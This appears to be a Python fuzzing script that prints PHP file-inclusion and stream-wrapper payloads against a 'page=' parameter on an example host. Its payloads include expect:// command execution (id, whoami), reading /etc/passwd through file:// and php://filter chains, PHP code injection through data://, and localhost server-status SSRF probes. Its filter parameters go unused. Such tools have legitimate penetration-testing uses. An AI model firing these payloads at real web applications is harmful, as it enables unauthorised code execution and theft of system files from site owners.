
def wrapper_expect_fuzz(url, hcode=(), hsize=(), cookie=None):
    cmds = ["ls", "pwd", "id", "whoami", "cd"]
    for cmd in cmds:
        print(f"{url}expect://{cmd}")
        print(f"{url}expect://{cmd}00")
    
def wrapper_glob_fuzz(url, hcode=(), hsize=(), cookie=None):
    dirs = ["/etc/", "/tmp/", "/var/www/html/"]
    for d in dirs:
        print(f"{url}glob://{d}*")
        print(f"{url}glob://{d}*%00")
        print(f"{url}glob://{d}*.*")
        print(f"{url}glob://{d}*.*%00")
    
    
   
def wrapper_http_fuzz(url, hcode=(), hsize=(), cookie=None):
    print(f"{url}http://127.0.0.1/server-status")
    print(f"{url}http://127.0.0.1/server-status%00")
    print(f"{url}http://localhost/server-status")
    print(f"{url}http://localhost/server-status%00")
    print(f"{url}http://{url}/server-status")
    print(f"{url}http://{url}/server-status%00")
    

def wrapper_ftp_fuzz(url, hcode=(), hsize=(), cookie=None):
    print(f"{url}ftp://127.0.0.1/")
    print(f"{url}ftp://127.0.0.1/%00")
    print(f"{url}ftp://127.0.0.1/pub")
    print(f"{url}ftp://127.0.0.1/pub%00")
    print(f"{url}ftp://localhost/")
    print(f"{url}ftp://localhost/%00")
    print(f"{url}ftp://localhost/pub")
    print(f"{url}ftp://localhost/pub%00")
    print(f"{url}ftp://{url}/")
    print(f"{url}ftp://{url}/%00")
    print(f"{url}ftp://{url}/pub")
    print(f"{url}ftp://{url}/pub%00")
    
    
def wrapper_file_fuzz(url, payload, hcode=(), hsize=(), cookie=None):
    print(f"{url}file://{payload}")
    print(f"{url}file://{payload}%00")
    
def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), cookie=None):
    print(f"{url}data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>")
    print(f"{url}data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>%00")
    print(f"{url}data://text/plain,<?php echo base64_encode(phpinfo()); ?>")
    print(f"{url}data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00")
    print(f"{url}data://text/plain,<?php phpinfo(); ?>")
    print(f"{url}data://text/plain,<?php phpinfo(); ?>%00")
    
def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), cookie=None):
    print(f"{url}compress.zlib://{payload}")
    print(f"{url}compress.zlib://{payload}%00")    
    print(f"{url}compress.bzip2://{payload}")
    print(f"{url}compress.bzip2://{payload}%00")
    
    
def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), cookie=None):  
    for n in range(101):
        print(f"{url}php://fd/{n}")
        print(f"{url}php://fd/{n}%00")
    print(f"{url}php://filter/convert.base64-decode/resource={payload}")
    print(f"{url}php://filter/convert.iconv.utf-8.utf-16le/resource={payload}")
    print(f"{url}php://filter/convert.base64-encode|convert.base64-decode/resource={payload}")
    print(f"{url}php://filter/convert.quoted-printable-encode/resource={payload}")
    print(f"{url}php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}")
    print(f"{url}php://filter/string.strip_tags/resource={payload}")
    print(f"{url}php://filter/string.toupper/string.rot13/string.tolower/resource={payload}")
    print(f"{url}php://filter/zlib.deflate/convert.base64-encode/resource={payload}")
    print(f"{url}php://filter/zlib.inflate/resource={payload}")


    
wrapper_expect_fuzz("http://test.ru?page=")
wrapper_glob_fuzz("http://test.ru?page=")
wrapper_http_fuzz("http://test.ru?page=")
wrapper_ftp_fuzz("http://test.ru?page=")
wrapper_file_fuzz("http://test.ru?page=", "/etc/passwd")
wrapper_compress_fuzz("http://test.ru?page=", "/etc/passwd")
wrapper_php_fuzz("http://test.ru?page=", "/etc/passwd")